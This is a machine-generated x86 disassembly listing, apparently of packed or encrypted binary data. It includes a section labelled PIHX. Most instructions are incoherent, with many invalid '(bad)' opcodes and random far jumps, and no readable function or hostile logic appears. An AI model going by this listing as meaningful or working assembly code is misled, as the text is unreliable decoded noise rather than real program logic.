  4189e2:	sub    eax,0xd15ac8f6
  4189e7:	or     dh,BYTE PTR [edx]
  4189e9:	sub    dh,ch
  4189eb:	adc    esp,DWORD PTR [eax+0x5b]
  4189ee:	jg     0x418a42
  4189f0:	inc    ebp
  4189f1:	lods   eax,DWORD PTR ds:[esi]
  4189f2:	jne    0x41898d
  4189f4:	dec    edi
  4189f5:	push   esi
  4189f6:	jecxz  0x418a1a
  4189f8:	(bad)  
  4189f9:	adc    ch,bl
  4189fb:	enter  0x34de,0x85
  4189ff:	pop    edx
  418a00:	mov    ds:0x4cdbdc1,eax
  418a05:	sbb    BYTE PTR [eax+0x6a],bl
  418a08:	and    dh,al
  418a0a:	mov    es,WORD PTR [edx]
  418a0c:	adc    al,0xf0
  418a0e:	xchg   ecx,eax
  418a0f:	mov    dl,0xf3
  418a11:	mov    ah,0x19
  418a13:	sbb    ah,BYTE PTR fs:[esi]
  418a16:	inc    ecx
  418a17:	xchg   edi,eax
  418a18:	mov    eax,0xaaac0296
  418a1d:	ins    DWORD PTR es:[edi],dx
  418a1e:	jo     0x4189e6
  418a20:	cwde   
  418a21:	pusha  
  418a22:	mov    dh,0xa
  418a24:	jge    0x418a3e
  418a26:	outs   dx,BYTE PTR ds:[esi]
  418a27:	call   0xa5506496
  418a2c:	(bad)  
  418a2d:	pusha  
  418a2e:	jo     0x418a14
  418a30:	fs mov cl,0x65
  418a33:	inc    ebp
  418a34:	mov    dh,0xe9
  418a36:	shl    esi,cl
  418a38:	or     BYTE PTR [esi+0x62],al
  418a3b:	jbe    0x418a8f
  418a3d:	mov    al,0x4c
  418a3f:	jo     0x418ab6
  418a41:	adc    al,0x34
  418a43:	shr    BYTE PTR [eax+0x802b45e],1
  418a49:	lods   eax,DWORD PTR ds:[esi]
  418a4a:	lods   eax,DWORD PTR ds:[esi]
  418a4b:	inc    eax
  418a4c:	loope  0x418a8e
  418a4e:	sbb    al,0xea
  418a50:	push   ebp
  418a51:	mov    esi,0xab08b4b6
  418a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a57:	jno    0x418a1d
  418a59:	sar    DWORD PTR [edx-0x25],1
  418a5c:	and    al,0x4
  418a5e:	mov    esp,0x2c265106
  418a63:	inc    esp
  418a64:	or     al,0xc1
  418a66:	sbb    al,0x96
  418a68:	loopne 0x418a99
  418a6a:	ss ds dec esi
  418a6d:	add    BYTE PTR [ebx-0x72],ch
  418a70:	jle    0x418a48
  418a72:	and    dl,BYTE PTR [ecx+0x64]
  418a75:	mov    ds:0x16db02f0,al
  418a7a:	jl     0x418a3e
  418a7c:	test   al,0xb6
  418a7e:	push   0xe4ba1ef4
  418a83:	sahf   
  418a84:	mov    cs,WORD PTR [edi]
  418a86:	cmp    al,0xa0
  418a88:	into   
  418a89:	pop    esi
  418a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8b:	mov    BYTE PTR [ecx-0x793b3016],al
  418a91:	xchg   BYTE PTR [ebp-0x76f70c68],ah
  418a97:	add    al,0x7a
  418a99:	loope  0x418a3e
  418a9b:	mov    ch,0x4e
  418a9d:	inc    edx
  418a9e:	dec    esp
  418a9f:	inc    ecx
  418aa0:	push   edx
  418aa1:	xchg   ebp,eax
  418aa2:	jl     0x418aef
  418aa4:	mov    WORD PTR [edi],ds
  418aa6:	jp     0x418ae9
  418aa8:	inc    esp
  418aa9:	xchg   esi,eax
  418aaa:	mov    esi,0xd1071ccc
  418aaf:	sbb    al,0xd6
  418ab1:	xor    eax,0xe2400dfa
  418ab6:	sub    al,0x40
  418ab8:	add    eax,0xf5a2d6a0
  418abd:	fs xchg esi,eax
  418abf:	and    al,0xf9
  418ac1:	(bad)  
  418ac2:	aam    0xac
  418ac4:	std    
  418ac5:	mov    dl,0x51
  418ac7:	sbb    ebp,DWORD PTR [esi]
  418ac9:	adc    cl,dl
  418acb:	cli    
  418acc:	call   0x3744:0x862e8ac4
  418ad3:	mov    DWORD PTR [ebx+0x5c],esp
  418ad6:	nop
  418ad7:	call   0x6924:0x40db0a8
  418ade:	push   0x34
  418ae0:	call   0x28d9:0xa3a281dd
  418ae7:	imul   esi,eax,0xfffffffe
  418aea:	mov    eax,0xdd1a0378
  418aef:	inc    edx
  418af0:	xor    DWORD PTR [eax-0x9],0xffffff9a
  418af4:	inc    eax
  418af5:	xchg   DWORD PTR [ebp+0x231e0382],eax
  418afb:	inc    esp
  418afc:	shr    DWORD PTR [eax-0x63],0xf5
  418b00:	dec    edx
  418b01:	sbb    al,BYTE PTR [ecx+0x4212c81c]
  418b07:	xor    eax,edx
  418b09:	and    bl,BYTE PTR [eax]
  418b0b:	mov    dh,0x31
  418b0d:	jmp    0x418b09
  418b0f:	xor    cl,dh
  418b11:	mov    ?,eax
  418b13:	pop    edi
  418b14:	cs (bad) 
  418b16:	bound  ecx,QWORD PTR [edx]
  418b18:	mov    dl,0x1
  418b1a:	mov    cl,BYTE PTR [edx+0x44fa275a]
  418b20:	inc    esp
  418b21:	cs xchg edx,eax
  418b23:	mov    ds:0x2fa0aabe,al
  418b28:	push   0x21cc4826
  418b2d:	les    ecx,FWORD PTR [eax]
  418b2f:	cs repz mov dh,0xc1
  418b33:	pop    esi
  418b34:	cmp    BYTE PTR [edx+0xed7cee],0xd
  418b3b:	xor    al,0xaa
  418b3d:	(bad)
  418b40:	les    edx,FWORD PTR [eax]
  418b42:	adc    al,0x9e
  418b44:	retf   0x913
  418b47:	scas   eax,DWORD PTR es:[edi]
  418b48:	inc    esp
  418b49:	ins    BYTE PTR es:[edi],dx
  418b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b4b:	mov    bl,0x33
  418b4d:	dec    eax
  418b4e:	mov    cl,0x4a
  418b50:	test   BYTE PTR [ecx-0x30],0x3
  418b54:	pop    esi
  418b55:	push   eax
  418b56:	arpl   dx,si
  418b58:	gs jle 0x418b65
  418b5b:	sub    BYTE PTR [eax],0x40
  418b5e:	imul   esp,edx,0xffffffd6
  418b61:	pop    eax
  418b62:	fcomp  DWORD PTR [ebx+edx*8]
  418b65:	fcomi  st,st(4)
  418b67:	popa   
  418b68:	adc    eax,0x8be2ef16
  418b6d:	push   edx
  418b6e:	sti    
  418b6f:	rcr    BYTE PTR es:[ecx+0x33],1
  418b73:	test   BYTE PTR [edx],ch
  418b75:	ins    BYTE PTR es:[edi],dx
  418b76:	pop    es
  418b77:	loop   0x418bd3
  418b79:	fs jge 0x418b9e
  418b7c:	aam    0x61
  418b7e:	fs or  al,0x70
  418b81:	imul   esp,esi,0xffffffd1
  418b84:	mov    ch,BYTE PTR [esi]
  418b86:	add    al,0xec
  418b88:	inc    ebp
  418b89:	cwde   
  418b8a:	das    
  418b8b:	and    bl,BYTE PTR ds:0x90a6b515
  418b91:	dec    eax
  418b92:	pop    eax
  418b93:	mov    eax,0x689223ee
  418b98:	cmp    DWORD PTR [eax+0x14],ebp
  418b9b:	adc    al,0x5c
  418b9d:	adc    bh,ah
  418b9f:	test   BYTE PTR [eax],ch
  418ba1:	rol    BYTE PTR [edi+0x11f62054],cl
  418ba7:	dec    esi
  418ba8:	xor    DWORD PTR [eax],eax
  418baa:	fld    QWORD PTR [edx-0x763583ec]
  418bb0:	test   eax,0xf8e81
  418bb5:	jle    0x418bff
  418bb7:	fld    DWORD PTR [ecx+edx*8-0x41574fa4]
  418bbe:	pop    ecx
  418bbf:	push   eax
  418bc0:	add    DWORD PTR [ebx-0x64],ecx
  418bc3:	jg     0x418bc5
  418bc5:	mov    WORD PTR ds:0x322880e0,cs
  418bcb:	ins    BYTE PTR es:[edi],dx
  418bcc:	inc    esp
  418bcd:	cld    
  418bce:	(bad)  
  418bd0:	and    DWORD PTR [eax+0x40ca9406],eax
  418bd6:	mov    dh,0x98
  418bd8:	pop    es
  418bd9:	add    ch,BYTE PTR [ebp-0x6f]
  418bdc:	pop    edx
  418bdd:	fcmovu st,st(4)
  418bdf:	out    0x22,eax
  418be1:	push   ebx
  418be2:	jb     0x418b6c
  418be4:	or     dl,BYTE PTR [ecx+0x52acdf80]
  418bea:	bnd jmp 0x418bc7
  418bed:	inc    esp
  418bee:	adc    eax,0x11ab28e
  418bf3:	add    eax,0x9ea0b66d
  418bf8:	adc    DWORD PTR [eax+0x33],ecx
  418bfb:	fs (bad) 
  418bfd:	out    dx,al
  418bfe:	repnz sub esi,DWORD PTR [ecx+eiz*8+0x4d2af852]
  418c06:	mov    ebx,0x3abc3bba
  418c0b:	push   edx
  418c0c:	test   BYTE PTR [esi],al
  418c0e:	add    al,0xaf
  418c10:	cmp    al,0xea
  418c12:	jno    0x418bd4
  418c14:	call   0xa242:0xb4d404b
  418c1b:	ror    BYTE PTR [edx],0x49
  418c1e:	hlt    
  418c1f:	or     dl,BYTE PTR [edi+0x26]
  418c22:	ficom  DWORD PTR [eax+0x57]
  418c25:	push   ss
  418c26:	jmp    DWORD PTR [eax-0x4c93f598]
  418c2c:	sub    dh,BYTE PTR [eax]
  418c2e:	gs mov dl,0x2e
  418c31:	dec    ebx
  418c32:	mov    al,ds:0xdf2dba70
  418c37:	pusha  
  418c38:	or     ecx,DWORD PTR [edx]
  418c3a:	xor    BYTE PTR [edx],ch
  418c3c:	data16 aaa 
  418c3e:	in     al,dx
  418c3f:	lods   al,BYTE PTR ds:[esi]
  418c40:	mov    dh,0xe7
  418c42:	hlt    
  418c43:	add    BYTE PTR [edx+ebx*2+0x4],bl
  418c47:	scas   eax,DWORD PTR es:[edi]
  418c48:	add    eax,0xe46c8134
  418c4d:	or     DWORD PTR [eax],eax
  418c4f:	fiadd  DWORD PTR [edi+0x12]
  418c52:	sub    esp,DWORD PTR [esi-0x7967b4bb]
  418c58:	and    BYTE PTR [ecx+ebp*4+0x15],ah
  418c5c:	dec    ebp
  418c5d:	ins    BYTE PTR es:[edi],dx
  418c5e:	ret    
  418c5f:	inc    esi
  418c60:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c62:	xor    BYTE PTR [esi+0x6e],0xcd
  418c66:	or     eax,0x8a13ad2f
  418c6b:	and    ecx,DWORD PTR [eax]
  418c6d:	out    0x8a,al
  418c6f:	add    BYTE PTR [edx],bh
  418c71:	ins    DWORD PTR es:[edi],dx
  418c72:	test   edx,ebx
  418c74:	jo     0x418c90
  418c76:	int3   
  418c77:	push   esp
  418c78:	call   0x4386ecea
  418c7d:	adc    bh,BYTE PTR [esi]
  418c7f:	jp     0x418c21
  418c81:	cld    
  418c82:	jl     0x418c86
  418c84:	ss fdiv st,st(6)
  418c87:	mov    bl,BYTE PTR [edi+0x647495b8]
  418c8d:	outs   dx,BYTE PTR ds:[esi]
  418c8e:	push   ecx
  418c8f:	add    DWORD PTR [eax-0x5b],edi
  418c92:	or     eax,0x62527647
  418c97:	cmp    al,0xf0
  418c99:	push   es
  418c9a:	(bad)  
  418c9b:	rcl    BYTE PTR ds:0x44135d74,cl
  418ca1:	(bad)  
  418ca2:	into   
  418ca3:	aas    
  418ca4:	shl    BYTE PTR [ecx*2+0x5676c24a],cl
  418cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cac:	stos   BYTE PTR es:[edi],al
  418cad:	cmp    cl,BYTE PTR [esi]
  418caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb0:	loop   0x418c59
  418cb2:	mov    WORD PTR ds:0x3c1f2405,es
  418cb8:	jo     0x418ce9
  418cba:	mov    ch,BYTE PTR [ebx]
  418cbc:	add    DWORD PTR [ebp-0x2c],edx
  418cbf:	(bad)  
  418cc0:	mov    dh,0xc1
  418cc2:	push   cs
  418cc3:	sub    eax,0xebae8da8
  418cc8:	inc    BYTE PTR [ecx-0x70]
  418ccb:	push   ebp
  418ccc:	xlat   BYTE PTR ds:[ebx]
  418ccd:	pop    ss
  418cce:	aad    0x5e
  418cd0:	in     al,0x52
  418cd2:	aaa    
  418cd3:	repnz in al,dx
  418cd5:	push   ds
  418cd6:	mov    DWORD PTR [ebx+0x41],0x323a9b5b
  418cdd:	(bad)  
  418cde:	adc    al,0x62
  418ce0:	popf   
  418ce1:	jle    0x418c68
  418ce3:	mov    BYTE PTR [edi],cl
  418ce5:	push   edx
  418ce6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418ce8:	and    bl,bl
  418cea:	jl     0x418d46
  418cec:	lock ins BYTE PTR es:[edi],dx
  418cee:	jecxz  0x418d2d
  418cf0:	jno    0x418d3c
  418cf2:	xchg   ebp,eax
  418cf3:	or     al,0xcc
  418cf5:	add    al,ah
  418cf7:	fwait
  418cf8:	pop    ecx
  418cf9:	in     eax,0x80
  418cfb:	ss or  al,0xb8
  418cfe:	fadd   st(0),st
  418d00:	call   0xdcd4:0xd8da9400
  418d07:	rcl    al,0x54
  418d0a:	push   0x60
  418d0c:	xor    al,BYTE PTR [ebp-0x59e1fd69]
  418d12:	inc    edi
  418d13:	ins    BYTE PTR es:[edi],dx
  418d14:	cli    
  418d15:	xor    BYTE PTR [ecx+0x5b],dh
  418d18:	imul   ecx,DWORD PTR [ebx],0xffffffae
  418d1b:	aam    0x63
  418d1d:	jmp    0x3722:0xbdd0b2e4
  418d24:	cli    
  418d25:	add    BYTE PTR [eax],0xae
  418d28:	inc    esp
  418d29:	mov    esp,0x5b8df9
  418d2e:	pop    esp
  418d2f:	pushf  
  418d30:	fld    DWORD PTR [eax]
  418d32:	test   al,0x53
  418d34:	int3   
  418d35:	mov    ebx,0xd8cf84b5
  418d3a:	mov    al,BYTE PTR cs:[edi+0x749594ae]
  418d41:	sar    BYTE PTR [ebx+eax*2-0x3f],1
  418d45:	sub    dh,dh
  418d47:	push   es
  418d48:	and    dh,BYTE PTR ds:[ebp+0x0]
  418d4c:	(bad)  
  418d4d:	adc    BYTE PTR [edx+0x20bd053f],cl
  418d53:	push   esi
  418d54:	push   edi
  418d55:	mov    cs,WORD PTR [ecx+esi*2-0x12baf228]
  418d5c:	push   edx
  418d5d:	repnz cdq 
  418d5f:	or     ch,BYTE PTR [esi+0x5c]
  418d62:	not    BYTE PTR [edx+0x7a113e44]
  418d68:	lods   al,BYTE PTR ds:[esi]
  418d69:	push   0x60
  418d6b:	jnp    0x418d47
  418d6d:	xchg   esp,eax
  418d6e:	cmp    BYTE PTR [eax-0x7c],ah
  418d71:	mov    es,WORD PTR [edi+0x0]
  418d74:	cmp    ah,cl
  418d76:	xchg   ebx,eax
  418d77:	jb     0x418ddc
  418d79:	imul   ebp,DWORD PTR [edx-0x3f],0x35
  418d7d:	cld    
  418d7e:	dec    ecx
  418d7f:	test   BYTE PTR [eax],ah
  418d81:	mov    BYTE PTR [ebp+edx*2-0x3e3fee03],al
  418d88:	cmp    BYTE PTR [eax],bl
  418d8a:	in     al,0x92
  418d8c:	add    cl,dh
  418d8e:	(bad)  
  418d8f:	dec    eax
  418d90:	dec    eax
  418d91:	push   eax
  418d92:	mov    ch,0x75
  418d94:	or     ch,al
  418d96:	cmp    bl,BYTE PTR [edi]
  418d98:	lods   eax,DWORD PTR ds:[esi]
  418d99:	mov    ds:0x68d8a203,al
  418d9e:	mov    dh,0xa0
  418da0:	enter  0x5ad7,0x68
  418da4:	push   0x75318eca
  418da9:	push   eax
  418daa:	push   0x9c286a52
  418daf:	fsubr  DWORD PTR [esi]
  418db1:	mul    BYTE PTR [edx-0x20]
  418db4:	dec    ecx
  418db5:	or     al,0x20
  418db7:	inc    esi
  418db8:	ins    DWORD PTR es:[edi],dx
  418db9:	add    BYTE PTR [eax+0x46],bl
  418dbc:	pop    es
  418dbd:	test   dl,bl
  418dbf:	or     ch,0x30
  418dc2:	ins    BYTE PTR es:[edi],dx
  418dc3:	xor    edx,ecx
  418dc5:	loope  0x418e33
  418dc7:	cmp    dh,al
  418dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dca:	data16 or BYTE PTR [edx],ah
  418dcd:	sbb    BYTE PTR [eax+0x31424214],cl
  418dd3:	ficom  WORD PTR [esi+edx*2]
  418dd6:	inc    edx
  418dd7:	add    BYTE PTR [edx+edi*1+0xb],bh
  418ddb:	mov    al,ds:0x2cc21d6d
  418de0:	xchg   esp,eax
  418de1:	imul   ebx,DWORD PTR [edi+edi*8],0x2f
  418de5:	fmul   QWORD PTR [edi+0xa]
  418de8:	mov    dh,0x8a
  418dea:	sub    ecx,DWORD PTR [eax]
  418dec:	mov    eax,DWORD PTR [edx-0x1a1da167]
  418df2:	pop    edx
  418df3:	push   ebx
  418df4:	add    eax,0x58d034fc
  418df9:	int    0x22
  418dfb:	(bad)  
  418dfc:	cli    
  418dfd:	icebp  
  418dfe:	fld    TBYTE PTR [edx-0x71]
  418e01:	repnz mov ah,0x7b
  418e04:	pop    esi
  418e05:	xor    eax,ebp
  418e07:	push   esp
  418e08:	inc    eax
  418e09:	inc    ebx
  418e0a:	shl    DWORD PTR [ebx-0x4ddc65b0],0x86
  418e11:	nop
  418e12:	in     al,0x32
  418e14:	inc    ecx
  418e15:	ficomp DWORD PTR [edx]
  418e17:	pop    edx
  418e18:	rcr    DWORD PTR [eax-0x60],1
  418e1b:	or     BYTE PTR [esi+edx*1],cl
  418e1e:	shl    DWORD PTR ds:0xc400586d,1
  418e24:	sbb    bl,BYTE PTR [esi-0x5e0af526]
  418e2a:	pusha  
  418e2b:	aas    
  418e2c:	add    BYTE PTR [edx-0x63],cl
  418e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e30:	sub    BYTE PTR [edx+0x4378493d],0xae
  418e37:	in     al,dx
  418e38:	xchg   ecx,eax
  418e39:	add    al,cl
  418e3b:	jmp    0xa8b4:0x3e0a78e6
  418e42:	jl     0x418e54
  418e44:	xchg   edx,eax
  418e45:	xor    al,0x45
  418e47:	pop    edx
  418e48:	leave  
  418e49:	mov    edx,0xaa6985c4
  418e4e:	mov    al,0x14
  418e50:	jecxz  0x418ec2
  418e52:	fld    QWORD PTR [edx+0x5563aa4b]
  418e58:	push   es
  418e59:	lock movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418e5c:	sub    dl,BYTE PTR ds:0x7630ba6a
  418e62:	adc    BYTE PTR [edx-0x2d],bl
  418e65:	loopne 0x418e57
  418e67:	jns    0x418e5f
  418e69:	and    DWORD PTR [eax-0x6bb66d65],ebp
  418e6f:	jo     0x418e05
  418e71:	arpl   WORD PTR [ebp+0x26],di
  418e74:	fidiv  DWORD PTR [edx+0x20a1280b]
  418e7a:	mov    eax,0xa86b54cb
  418e7f:	xchg   esi,eax
  418e80:	dec    ecx
  418e81:	inc    esi
  418e82:	pop    esi
  418e83:	jle    0x418ef9
  418e85:	mov    cl,0x64
  418e87:	add    BYTE PTR [edx+eax*2],al
  418e8a:	inc    ebp
  418e8b:	cld    
  418e8c:	mov    al,ds:0xd41fa73
  418e91:	fwait
  418e92:	dec    esp
  418e93:	pop    esi
  418e94:	push   ss
  418e95:	sbb    eax,0xa27ac2f6
  418e9a:	pop    ss
  418e9b:	les    esp,FWORD PTR [ebx]
  418e9d:	ss inc eax
  418e9f:	lds    esi,FWORD PTR [edx+0x593ef1ad]
  418ea5:	shr    BYTE PTR [esi+0x1200f7e6],0x21
  418eac:	stos   BYTE PTR es:[edi],al
  418ead:	ss mov dh,0x6c
  418eb0:	push   edx
  418eb1:	sbb    dh,dh
  418eb3:	call   0x4f94:0x5e168bdf
  418eba:	inc    esi
  418ebb:	mov    esi,edx
  418ebd:	jo     0x418f24
  418ebf:	out    0x74,al
  418ec1:	outs   dx,BYTE PTR ds:[esi]
  418ec2:	sub    al,0x1c
  418ec4:	jl     0x418e48
  418ec6:	push   cs
  418ec7:	inc    ecx
  418ec8:	mov    cl,0xb2
  418eca:	data16 add BYTE PTR [edx+0x1],al
  418ece:	mov    ds:0xb690fd28,al
  418ed3:	add    al,0x58
  418ed5:	adc    edi,eax
  418ed7:	lock shr DWORD PTR cs:[ebp-0x59961d5f],cl
  418edf:	push   0x36
  418ee1:	mov    BYTE PTR [esi+edi*1+0x27],ch
  418ee5:	retf   0x756b
  418ee8:	rol    BYTE PTR [edi],1
  418eea:	ins    BYTE PTR es:[edi],dx
  418eeb:	call   0x9e85:0x4e423b48
  418ef2:	rcr    al,cl
  418ef4:	pusha  
  418ef5:	sub    edx,DWORD PTR [eax+0xc]
  418ef8:	inc    DWORD PTR [esp+eax*2]
  418efb:	cld    
  418efc:	jnp    0x418f10
  418efe:	rcr    BYTE PTR [ebx],1
  418f00:	pop    esi
  418f01:	ins    BYTE PTR es:[edi],dx
  418f02:	in     al,0x22
  418f04:	loopne 0x418eb6
  418f06:	add    BYTE PTR [ecx+eax*8+0x5a],ah
  418f0a:	shl    DWORD PTR [ebp-0x1aa8110f],1
  418f10:	retf   0x1408
  418f13:	inc    ecx
  418f14:	inc    eax
  418f15:	add    DWORD PTR [eax+0x2],edi
  418f18:	xor    BYTE PTR [eax],cl
  418f1a:	cld    
  418f1b:	rol    BYTE PTR [eax+0x68],0x52
  418f1f:	mov    eax,ds:0xb8082cca
  418f24:	cmp    bl,BYTE PTR [ecx]
  418f26:	inc    ecx
  418f27:	pushf  
  418f28:	sub    BYTE PTR [eax+esi*2-0x3ddd36a6],ch
  418f2f:	add    DWORD PTR [bp+di+0x12f4],edi
  418f34:	jmp    0x51e1837f
  418f39:	sub    al,0xe0
  418f3b:	sbb    ch,BYTE PTR [eax-0x76ed55e5]
  418f41:	sbb    eax,0x648e4d05
  418f46:	inc    ecx
  418f47:	fdiv   DWORD PTR [ecx-0x2f50db3a]
  418f4d:	inc    eax
  418f4e:	rol    DWORD PTR ds:0xa14140c,1
  418f54:	call   0x3658:0x64a3849b
  418f5b:	and    BYTE PTR [eax],ch
  418f5d:	mov    eax,0x148d005d
  418f62:	ins    BYTE PTR es:[edi],dx
  418f63:	into   
  418f64:	test   al,0xc2
  418f66:	popa   
  418f67:	sub    BYTE PTR [eax+0x74],cl
  418f6a:	(bad)  
  418f6b:	in     al,dx
  418f6c:	mov    bh,dl
  418f6e:	mov    dl,0x2a
  418f70:	mov    edx,0x67e85d96
  418f75:	jmp    0x946c:0x302b44d3
  418f7c:	or     ecx,DWORD PTR [edi-0x1114152c]
  418f82:	mov    eax,0xd1a09a2b
  418f87:	pop    esi
  418f88:	movlps xmm3,QWORD PTR [edx+0x23a4a04b]
  418f8f:	and    al,0x88
  418f91:	push   ds
  418f92:	inc    edx
  418f93:	sub    al,0xbc
  418f95:	loop   0x418fe7
  418f97:	push   es
  418f98:	inc    eax
  418f99:	lods   eax,DWORD PTR ds:[esi]
  418f9a:	mov    esi,ebx
  418f9c:	fs pushf 
  418f9e:	inc    esi
  418f9f:	adc    eax,0x6c2cbffa
  418fa4:	inc    ebp
  418fa5:	mov    dh,0x76
  418fa7:	mov    ds,WORD PTR [edi+0x4e]
  418faa:	inc    esi
  418fab:	adc    eax,0x5c144961
  418fb0:	push   edx
  418fb1:	out    dx,al
  418fb2:	jmp    0x418f86
  418fb4:	jae    0x418f7a
  418fb6:	xor    DWORD PTR [eax-0x6d65a733],esp
  418fbc:	retf   
  418fbd:	stos   BYTE PTR es:[edi],al
  418fbe:	cmc    
  418fbf:	add    al,0xa0
  418fc1:	fmul   DWORD PTR [eax+ebp*8-0x24]
  418fc5:	push   0xffffffcf
  418fc7:	jl     0x418ffd
  418fc9:	sbb    cl,ah
  418fcb:	out    0xfa,al
  418fcd:	or     dl,BYTE PTR [ebp+0x7]
  418fd0:	and    BYTE PTR [edi+0x2e],cl
  418fd3:	jmp    0xbf52:0xd29e6a0a
  418fda:	sub    BYTE PTR [ebx+0x68],0x62
  418fde:	sbb    ch,BYTE PTR [edx-0x4e]
  418fe1:	test   BYTE PTR [eax-0x2],ch
  418fe4:	cmp    ch,BYTE PTR [edx-0x6babca6]
  418fea:	pop    eax
  418feb:	pusha  
  418fec:	inc    esp
  418fed:	or     dh,BYTE PTR [edi+edi*4]
  418ff0:	inc    edx
  418ff1:	pop    ss
  418ff2:	pop    ebx
  418ff3:	add    eax,0x85b2d1d0
  418ff8:	pusha  
  418ff9:	sub    DWORD PTR [ecx+eax*8-0x7affccc6],ebx

Disassembly of section PIHX:

00419000 <PIHX>:
  419000:	or     esi,DWORD PTR [ebx+edi*8+0x401004ff]
  419007:	add    BYTE PTR [edx],cl
  419009:	push   es
  41900a:	push   ebx
  41900b:	je     0x41907f
  41900d:	imul   ebp,DWORD PTR [esi+0x67],0x3f011658
  419014:	repz mov esp,0x1704ade6
  41901a:	fdiv   QWORD PTR [ebx]
  41901c:	call   0x327c27
  419021:	jns    0x418fbd
  419023:	iret   
  419024:	in     al,0x5c
  419026:	xor    DWORD PTR [eax-0x4c],edi
  419029:	pop    es
  41902a:	push   esp
  41902b:	dec    edi
  41902c:	bound  ebp,QWORD PTR [edx+0x65]
  41902f:	(bad)  
  419030:	imul   esp,DWORD PTR [ecx-0x11],0x66647463
  419037:	pop    es
  419038:	sbb    ecx,eax
  41903a:	push   es
  41903b:	push   ebx
  41903c:	jns    0x4190b1
  41903e:	je     0x4190a5
  419040:	ins    DWORD PTR es:[edi],dx
  419041:	jmp    0x84ad8e04
  419046:	and    al,0xf
  419048:	or     cl,BYTE PTR [ecx+0x49]
  41904b:	outs   dx,BYTE PTR ds:[esi]
  41904c:	sbb    dh,BYTE PTR [edx+0x66]
  41904f:	popa   
  419050:	arpl   WORD PTR [ebp-0x1f],sp
  419053:	add    edi,edi
  419055:	lahf   
  419056:	int3   
  419057:	push   es
  419058:	rcr    BYTE PTR [ebx+0x46],0x3
  41905c:	add    bh,bh
  41905e:	dec    esp
  419060:	add    DWORD PTR [esp+0x4],0xfffffff8
  419065:	jmp    0x6dcfd461
  41906a:	inc    esp
  41906b:	inc    edx
  41906c:	je     0x419081
  41906e:	pushf  
  41906f:	mov    al,0xcc
  419071:	int3   
  419072:	mov    cl,0xa0
  419074:	out    dx,eax
  419075:	(bad)  
  419076:	out    dx,eax
  419077:	mov    esp,0x91c506bb
  41907c:	xchg   edi,eax
  41907d:	shr    DWORD PTR [esi],1
  41907f:	or     BYTE PTR [edx-0x72d89260],cl
  419085:	adc    al,0x4c
  419087:	adc    DWORD PTR [esi],eax
  419089:	fucomp st(7)
  41908b:	int    0xcb
  41908d:	pop    es
  41908e:	fnstsw WORD PTR [edi]
  419090:	or     al,0xe6
  419092:	or     al,0x10
  419094:	inc    eax
  419095:	dec    esp
  419096:	push   edx
  419097:	pop    eax
  419098:	or     BYTE PTR [esi+0x72],cl
  41909b:	xchg   edx,eax
  41909c:	push   edx
  41909d:	push   0x8d541152
  4190a2:	dec    ecx
  4190a3:	neg    DWORD PTR [edi-0x741e9b20]
  4190a9:	sar    bh,0x25
  4190ac:	mov    BYTE PTR [ecx+0x41],dh
  4190af:	add    BYTE PTR [edi],cl
  4190b1:	test   cl,cl
  4190b3:	leave  
  4190b4:	leave  
  4190b5:	leave  
  4190b6:	cmp    BYTE PTR [eax+edi*2-0x64],0xc9
  4190bb:	leave  
  4190bc:	leave  
  4190bd:	leave  
  4190be:	je     0x419058
  4190c0:	jo     0x41912e
  4190c2:	leave  
  4190c3:	leave  
  4190c4:	leave  
  4190c5:	leave  
  4190c6:	push   0xc95c6064
  4190cb:	leave  
  4190cc:	leave  
  4190cd:	leave  
  4190ce:	pop    eax
  4190cf:	push   esp
  4190d0:	push   eax
  4190d1:	dec    esp
  4190d2:	leave  
  4190d3:	leave  
  4190d4:	leave  
  4190d5:	leave  
  4190d6:	dec    eax
  4190d7:	xchg   esp,eax
  4190d8:	inc    esp
  4190d9:	inc    eax
  4190da:	leave  
  4190db:	leave  
  4190dc:	leave  
  4190dd:	leave  
  4190de:	cmp    al,0xac
  4190e0:	test   al,0xa4
  4190e2:	leave  
  4190e3:	leave  
  4190e4:	leave  
  4190e5:	leave  
  4190e6:	cmp    BYTE PTR [esp+edi*4],dh
  4190e9:	mov    eax,0xc9c9c9c9
  4190ee:	mov    ah,0x30
  4190f0:	sub    al,0x28
  4190f2:	sub    edi,DWORD PTR [esi]
  4190f4:	cld    
  4190f5:	retf   
  4190f6:	and    al,0x53
  4190f8:	add    esp,0xffffffbc
  4190fb:	mov    ebx,0xe854b00a
  419100:	add    BYTE PTR [ecx],0xdc
  419103:	je     0x4190bc
  419105:	call   FWORD PTR [ebx+0x74012cf6]
  41910b:	add    eax,0x245cb70f
  419110:	xor    BYTE PTR [ebx+0x5b4436c3],cl
  419116:	ret    
  419117:	(bad)  
  419118:	and    BYTE PTR [esp+ebx*4+0x181c9c9c],bl
  41911f:	adc    al,0x10
  419121:	sbb    DWORD PTR [esp+ebx*4+0x4080c9c],0xfffffff4
  419129:	cld    
  41912a:	ins    BYTE PTR es:[edi],dx
  41912b:	(bad)  
  41912c:	in     eax,dx
  41912d:	mov    ebx,0x83dc65e0
  419132:	cmp    eax,DWORD PTR [eax]
  419134:	jne    0x41918f
  419136:	push   0x6a0644
  41913b:	add    bl,BYTE PTR [eax-0x64010277]
  419141:	fisttp QWORD PTR [eax]
  419143:	cmp    DWORD PTR [esi+eax*1+0x2c],0x7
  419148:	xor    eax,eax
  41914a:	mov    DWORD PTR [esp],eax
  41914d:	jmp    0x41919f
  41914f:	mov    esp,DWORD PTR [edx]
  419151:	mov    edx,DWORD PTR ds:0x5cdfb7dc
  419157:	neg    DWORD PTR [eax-0x77]
  41915a:	adc    BYTE PTR [edi],dl
  41915c:	mov    ds:0xd08b3615,eax
  419161:	add    edx,edx
  419163:	mov    ecx,DWORD PTR [esp+ebx*1-0x73]
  419167:	push   esp
  419168:	sar    edi,1
  41916a:	out    dx,al
  41916b:	scas   al,BYTE PTR es:[edi]
  41916c:	jecxz  0x419172
  41916e:	mov    DWORD PTR [edx+ecx*8-0x75],edx
  419172:	pop    es
